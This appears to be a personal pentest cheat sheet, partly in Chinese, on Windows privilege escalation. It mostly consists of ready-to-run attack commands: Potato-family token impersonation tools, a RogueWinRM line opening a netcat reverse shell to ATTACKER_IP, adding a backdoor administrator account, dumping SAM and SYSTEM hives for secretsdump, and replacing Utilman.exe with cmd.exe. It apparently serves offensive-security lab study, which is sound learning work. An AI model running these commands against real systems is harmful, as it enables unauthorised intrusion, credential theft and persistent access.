### LOLBAS
```powershell
whoami
whoami /groups 
whoami /all

net user <user_name>
Get-LocalUser <user_name>

net localgroup Administrators
Get-LocalGroupMember <group_name>
```

### [PsLoggedOn](https://learn.microsoft.com/en-us/sysinternals/downloads/psloggedon) 
查看用户SID, 可远程查看已登录用户(>=win8)
```powershell
.\PsLoggedon.exe \\files04
```
# Add User
```powershell
net user afsimmons enterpasswordhere /add
net localgroup Administrators afsimmons /add
#Remote Desktop Users, Remote Management Users
```
# Exploit

## Abuse Windows Privileges
[Priv2Admin](https://github.com/gtworek/Priv2Admin) Github项目中找到一个全面的可利用特权列表。
### SeImpersonate  / SeAssignPrimaryToken
[Potatoes](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)：一类提权漏洞 -->[download](https://raw.githubusercontent.com/k4sth4/Rogue-Potato/main/RoguePotato.exe)
[GenericPotato](https://github.com/micahvandeusen/GenericPotato): GenericPotato 修改后的SweetPotato, 可以通过HTTP进行提权，支持SSRF。而不只是命名管道。
[RoguePotato](https://github.com/k4sth4/Rogue-Potato/blob/main/RoguePotato.exe): Potato类提权的二进制文件，适用于Win10/winServer2019以上版本
[RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)：工具
[Juicy-Potato-x86](https://github.com/ivanitlearning/Juicy-Potato-x86): x86版本的JuicyPotato

If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato
If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato
#### SweetPotato
CLSID: https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise
Rule All !
```powershell
.\SweetPotato.exe -p <prog> -e [DCOM|WinRM|EfsRpc|PrintSpoofer(default)] -a <args>
#server 2008
.\juicypotato86.exe -c   {69AD4AEE-51BE-439b-A92C-86AE490E8B30} -p .\authby.exe -t * -l 1337
```
#### PrintSpoofer
```powershell
.\PrintSpoofer.exe -i -c powershell.exer
```
#### RoguePotato
Local:
```bash
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
```
```powershell
.\RoguePotato.exe -r YOUR_IP -e "command" -l 9999
```
#### RogueWinRM (5985 close)
```powershell
RoguewinRM.exe -p C:(windows\system32\cmd.exe
.\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```
### SeBackup / SeRestore
Windows
```powershell
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive
#转储其他用户目录
robocopy /B C:\users\enterpriseadmin\desktop C:\users\enterpriseuser\desktop /E
```
Linux
```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
pypykatz registry --sam /tmp/sam /tmp/system
```
### SeTakeOwnership
#### [[User-Privs PrivEsc#SeTakeOwnershipPrivilege|HTB - SeTakeOwnershipPrivilege]]
利用system运行的服务，然后接管服务二进制文件。--> [[Editable Service]]
接管重要文件的权限(如密码文件等) --> [[User-Privs PrivEsc]]
#### Utilman
```powershell
#该利用锁屏提权，需RDP。替换二进制文件锁屏后，点击辅助按钮触发
takeown /f c:\Windows\System32\Utilman.exe
icacls c:\Windows\System32\Utilman.exe /grant {$Current_User}:F
C:\Windows\System32\> copy cmd.exe utilman.exe
```
